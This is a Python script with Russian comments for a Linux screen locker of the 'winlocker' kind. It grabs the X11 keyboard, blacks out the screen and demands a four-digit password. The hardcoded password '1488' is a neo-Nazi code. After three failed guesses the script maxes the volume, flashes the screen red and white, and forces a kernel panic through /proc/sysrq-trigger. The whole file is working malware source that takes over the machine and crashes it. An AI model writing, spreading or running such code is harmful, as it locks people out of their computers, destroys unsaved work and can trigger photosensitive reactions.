#!/usr/bin/env python3
import os
import sys
import time
import threading
from Xlib import X, XK
from Xlib.display import Display
from Xlib.ext import randr
import subprocess

PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS

# ---------- Громкий звук ----------
def play_loud_sound():
    # Берём системный звук ошибки, предварительно выкрутив громкость на 100%
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

# ---------- Уничтожение системы ----------
def trigger_kernel_panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")   # немедленный kernel panic и перезагрузка

# ---------- Захват экрана и клавиатуры через X11 ----------
class GrabLocker:
    def __init__(self):
        self.display = Display()
        self.screen = self.display.screen()
        self.root = self.screen.root
        self.width = self.screen.width_in_pixels
        self.height = self.screen.height_in_pixels

        # Создаём чёрное полноэкранное окно
        self.window = self.root.create_window(
            0, 0, self.width, self.height, 0,
            self.screen.root_depth,
            X.InputOutput,
            X.CopyFromParent,
            background_pixel=self.screen.black_pixel,
            event_mask=X.KeyPressMask | X.KeyReleaseMask | X.ExposureMask,
            override_redirect=True,              # без рамок, поверх всего
        )
        self.window.map()
        self.display.flush()

        # Захватываем клавиатуру — все нажатия идут только нам
        self.window.grab_keyboard(
            True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime
        )
        self.display.flush()

        # Графический контекст для рисования текста
        self.gc = self.window.create_gc(
            foreground=self.screen.black_pixel,   # будет менять на зелёный
            background=self.screen.black_pixel,
        )

        self.input_buffer = ""
        self.running = True
        self.flash_active = False

    def draw_text(self, text, y, color="green"):
        """Рисует строку текста зелёным цветом по центру."""
        # Очистка экрана (заливка чёрным) не требуется, будем перерисовывать отдельные элементы.
        # Но для простоты будем каждый раз заново выводить весь текст (очистка через фон).
        self.window.clear_area(0, 0, self.width, self.height)
        if color == "green":
            self.gc.change(foreground=self.screen.alloc_named_color("green").pixel)
        elif color == "red":
            self.gc.change(foreground=self.screen.alloc_named_color("red").pixel)
        else:
            self.gc.change(foreground=self.screen.alloc_named_color("white").pixel)

        # Вывод текста (очень примитивно, без учёта шрифтов, но читаемо)
        font = self.display.open_font("fixed")
        self.window.draw_text(font, self.gc, self.width//2 - 200, y, text.encode())
        self.display.flush()

    def redraw_screen(self):
        """Перерисовывает всё окно: шапку, попытки, поле ввода, клавиатуру."""
        self.window.clear_area(0, 0, self.width, self.height)
        # Заголовки
        self.draw_text("ВЫ ПОПАЛИ НА ВИНЛОК. УГАДАЙТЕ ПАРОЛЬ У ВАС 3 ПОПЫТКИ", 50, "green")
        self.draw_text("(четырёхзначный пароль)", 90, "green")
        self.draw_text(f"ОСТАЛОСЬ {attempts_left} ПОПЫТКИ", 140, "green")

        # Поле ввода (отображаем звёздочки)
        stars = "*" * len(self.input_buffer)
        self.draw_text(f"> {stars}", 200, "green")

        # Цифровая клавиатура
        keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
        for i, line in enumerate(keys):
            self.draw_text(line, 260 + i*40, "green")

    def start(self):
        self.redraw_screen()
        while self.running:
            event = self.display.next_event()
            if event.type == X.KeyPress:
                self.handle_keypress(event)
            elif event.type == X.Expose:
                self.redraw_screen()

    def handle_keypress(self, event):
        global attempts_left
        keysym = self.display.keycode_to_keysym(event.detail, 0)
        if keysym == XK.XK_Return:
            self.check_password()
        elif keysym == XK.XK_BackSpace:
            self.input_buffer = self.input_buffer[:-1]
            self.redraw_screen()
        elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
                        XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
            if len(self.input_buffer) < 4:
                self.input_buffer += chr(keysym)
                self.redraw_screen()
        # Все остальные клавиши игнорируются

    def check_password(self):
        global attempts_left
        if self.input_buffer == PASSWORD:
            self.cleanup()
            sys.exit(0)
        else:
            self.input_buffer = ""
            attempts_left -= 1
            if attempts_left <= 0:
                self.running = False
                self.trigger_failure()
            else:
                self.redraw_screen()

    def trigger_failure(self):
        # Запускаем звук в потоке
        threading.Thread(target=play_loud_sound, daemon=True).start()
        # Начинаем мигание
        self.flash_screen()
        # Через 5 секунд — kernel panic
        threading.Timer(5.0, trigger_kernel_panic).start()

    def flash_screen(self):
        """Бешеное мигание красным и белым 10 раз."""
        for i in range(10):
            color = "red" if i % 2 == 0 else "white"
            self.window.change_attributes(background_pixel=
                self.screen.alloc_named_color(color).pixel)
            self.display.flush()
            time.sleep(0.1)
        # Возвращаем чёрный, но это уже неважно
        self.window.change_attributes(background_pixel=self.screen.black_pixel)
        self.display.flush()

    def cleanup(self):
        self.display.ungrab_keyboard(X.CurrentTime)
        self.window.destroy()
        self.display.close()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Запустите скрипт с правами root (sudo).")
        sys.exit(1)
    locker = GrabLocker()
    locker.start()
